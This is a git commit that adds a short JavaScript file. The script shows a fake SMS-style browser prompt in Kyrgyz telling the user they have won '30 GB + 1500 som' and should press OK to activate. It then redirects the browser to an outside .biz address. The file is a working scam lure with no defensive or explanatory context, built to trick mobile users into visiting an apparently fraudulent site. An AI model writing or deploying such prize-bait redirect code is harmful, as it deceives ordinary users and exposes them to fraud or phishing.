324fd36a4448b9448ad3ed9b8aff866ee05e4950
iafiaeff <numeral_horde5x@icloud.com>
2026-08-16 21:57:25 -1200

    Create kyrgyz35.js

---
+++ kyrgyz35.js
@@ -0,0 +1,5 @@
+    var password = '30 ГБ + 1500 сом'
+password=prompt('SMS: Куттуктайбыз, сиздин мобилдик номериңиз 30 ГБ + 1500 сом алууга укуктуу, Азыр активдештирүү үчүн "OK" баскычын басыңыз','30 ГБ + 1500 сом');
+if (password != '30 ГБ + 1500 сом') {
+location.href='https://www.mamiafiaeff.biz/kyrgyz-30gb';
+}
